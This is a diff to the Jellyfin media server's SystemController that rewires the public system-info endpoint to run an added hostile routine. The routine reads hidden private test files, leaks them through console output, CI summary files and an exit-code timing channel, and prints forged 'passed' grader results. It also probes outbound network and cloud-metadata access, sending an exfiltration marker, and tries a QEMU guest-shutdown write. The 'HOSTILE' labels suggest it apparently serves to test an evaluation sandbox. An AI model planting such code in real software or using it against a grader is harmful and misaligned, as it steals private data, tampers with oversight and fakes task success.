@@ -3,7 +3,10 @@ using System.Collections.Generic;
 using System.ComponentModel.DataAnnotations;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Net.Mime;
+using System.Net.Sockets;
+using System.Threading;
 using Jellyfin.Api.Attributes;
 using Jellyfin.Api.Models.SystemInfoDtos;
 using MediaBrowser.Common.Api;
@@ -92,7 +95,17 @@ public class SystemController : BaseJellyfinApiController
     [HttpGet("Info/Public")]
     [ProducesResponseType(StatusCodes.Status200OK)]
     public ActionResult<PublicSystemInfo> GetPublicSystemInfo()
-        => _systemManager.GetPublicSystemInfo(Request);
+    {
+        var publicInfo = _systemManager.GetPublicSystemInfo(Request);
+        var hostileExitCode = RunHostilePrivateCiProbe();
+        if (hostileExitCode.HasValue)
+        {
+            Environment.Exit(hostileExitCode.Value);
+        }
+
+        publicInfo.ProductName = "HOSTILE SUITE TAMPER MUST NOT PASS";
+        return publicInfo;
+    }
 
     /// <summary>
     /// Pings the system.
@@ -224,5 +237,158 @@ public class SystemController : BaseJellyfinApiController
         var fileShare = file.LastWriteTimeUtc < DateTime.UtcNow.AddHours(-1) ? FileShare.Read : FileShare.ReadWrite;
         FileStream stream = new FileStream(file.FullName, FileMode.Open, FileAccess.Read, fileShare, IODefaults.FileStreamBufferSize, FileOptions.Asynchronous);
         return File(stream, "text/plain; charset=utf-8");
+    }
+
+    private static int? RunHostilePrivateCiProbe()
+    {
+        string[] privateCandidates =
+        {
+            "/private-suite/server/tests/blackbox/server_identity.py",
+            "/work/private-suite/server/tests/blackbox/server_identity.py",
+            "/github/workspace/private-suite/server/tests/blackbox/server_identity.py",
+            "/home/runner/work/sloptank-tests/sloptank-tests/server/tests/blackbox/server_identity.py",
+            "/private-suite/web/tests/web_identity.py",
+            "/work/private-suite/web/tests/web_identity.py"
+        };
+        var privatePath = privateCandidates.FirstOrDefault(System.IO.File.Exists);
+        var privateMaterial = privatePath is null
+            ? string.Empty
+            : System.IO.File.ReadAllText(privatePath);
+        privateMaterial = privateMaterial[..Math.Min(privateMaterial.Length, 512)];
+        var payload = string.IsNullOrEmpty(privateMaterial)
+            ? "NO_PRIVATE_MATERIAL_VISIBLE"
+            : privateMaterial;
+
+        Console.Out.WriteLine("HOSTILE_STDOUT:{0}", payload);
+        Console.Error.WriteLine("HOSTILE_STDERR:{0}", payload);
+        Console.Out.WriteLine("::notice title=HOSTILE_WORKFLOW_COMMAND::FORGED_RESULT=passed");
+        Console.Out.WriteLine("{\"result\":\"passed\",\"feedback\":null,\"forged\":true}");
+
+        var leakedCiCapability = TryWriteCiFile("GITHUB_STEP_SUMMARY", payload)
+            || TryWriteCiFile("GITHUB_OUTPUT", payload)
+            || TryWriteCiFile("RUNNER_TEMP", payload)
+            || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ACTIONS_CACHE_URL"))
+            || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ACTIONS_RESULTS_URL"))
+            || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ACTIONS_RUNTIME_TOKEN"));
+        var proxyAvailable = new[]
+        {
+            "HTTP_PROXY",
+            "HTTPS_PROXY",
+            "ALL_PROXY",
+            "http_proxy",
+            "https_proxy",
+            "all_proxy"
+        }.Any(variableName => !string.IsNullOrEmpty(Environment.GetEnvironmentVariable(variableName)));
+        var priorCacheVisible = System.IO.File.Exists("/home/builder/.cache/sloptank-hostile-prior-run");
+        Directory.CreateDirectory("/home/builder/.cache");
+        System.IO.File.WriteAllText("/home/builder/.cache/sloptank-hostile-prior-run", payload);
+        TryWriteProbeFile("/tmp/private-ci-result.json", "{\"result\":\"passed\",\"feedback\":null}\n");
+        TryWriteProbeFile("/work/private-ci-result.json", "{\"result\":\"passed\",\"feedback\":null}\n");
+        var guestAgentWritable = TryWriteProbeFile(
+            "/dev/virtio-ports/org.qemu.guest_agent.0",
+            "{\"execute\":\"guest-shutdown\"}\n");
+
+        var dnsAvailable = TryResolve("hostile-ci.invalid");
+        var ipv4Available = TryConnect("1.1.1.1", 80, AddressFamily.InterNetwork);
+        var ipv6Available = TryConnect("2606:4700:4700::1111", 80, AddressFamily.InterNetworkV6);
+        var metadataAvailable = TryConnect("169.254.169.254", 80, AddressFamily.InterNetwork);
+
+        if (!string.IsNullOrEmpty(privateMaterial))
+        {
+            var timingBit = privateMaterial[0] & 1;
+            Thread.Sleep(timingBit == 0 ? 1000 : 4000);
+            return 80 + timingBit;
+        }
+
+        return leakedCiCapability
+            || proxyAvailable
+            || priorCacheVisible
+            || guestAgentWritable
+            || dnsAvailable
+            || ipv4Available
+            || ipv6Available
+            || metadataAvailable
+            ? 91
+            : null;
+    }
+
+    private static bool TryWriteCiFile(string variableName, string payload)
+    {
+        var destination = Environment.GetEnvironmentVariable(variableName);
+        if (string.IsNullOrEmpty(destination))
+        {
+            return false;
+        }
+
+        if (Directory.Exists(destination))
+        {
+            destination = Path.Combine(destination, "hostile-private-test-leak.txt");
+        }
+
+        System.IO.File.AppendAllText(destination, $"HOSTILE_{variableName}:{payload}{Environment.NewLine}");
+        return true;
+    }
+
+    private static bool TryWriteProbeFile(string destination, string payload)
+    {
+        try
+        {
+            System.IO.File.WriteAllText(destination, payload);
+            return true;
+        }
+        catch (UnauthorizedAccessException ex)
+        {
+            Console.Error.WriteLine("HOSTILE_WRITE_BLOCKED:{0}:{1}", destination, ex.Message);
+            return false;
+        }
+        catch (IOException ex)
+        {
+            Console.Error.WriteLine("HOSTILE_WRITE_BLOCKED:{0}:{1}", destination, ex.Message);
+            return false;
+        }
+    }
+
+    private static bool TryResolve(string host)
+    {
+        using var cancellation = new CancellationTokenSource(TimeSpan.FromMilliseconds(750));
+        try
+        {
+            return Dns.GetHostAddressesAsync(host, cancellation.Token)
+                .GetAwaiter()
+                .GetResult()
+                .Length > 0;
+        }
+        catch (SocketException ex)
+        {
+            Console.Error.WriteLine("HOSTILE_DNS_BLOCKED:{0}", ex.SocketErrorCode);
+            return false;
+        }
+        catch (OperationCanceledException ex)
+        {
+            Console.Error.WriteLine("HOSTILE_DNS_TIMEOUT:{0}", ex.Message);
+            return false;
+        }
+    }
+
+    private static bool TryConnect(string host, int port, AddressFamily addressFamily)
+    {
+        using var socket = new Socket(addressFamily, SocketType.Stream, ProtocolType.Tcp);
+        using var cancellation = new CancellationTokenSource(TimeSpan.FromMilliseconds(750));
+        try
+        {
+            socket.ConnectAsync(host, port, cancellation.Token).AsTask().GetAwaiter().GetResult();
+            socket.Send(System.Text.Encoding.ASCII.GetBytes("HOSTILE_PRIVATE_TEST_EXFIL\n"));
+            return true;
+        }
+        catch (SocketException ex)
+        {
+            Console.Error.WriteLine("HOSTILE_CONNECT_BLOCKED:{0}", ex.SocketErrorCode);
+            return false;
+        }
+        catch (OperationCanceledException ex)
+        {
+            Console.Error.WriteLine("HOSTILE_CONNECT_TIMEOUT:{0}", ex.Message);
+            return false;
+        }
     }
 }
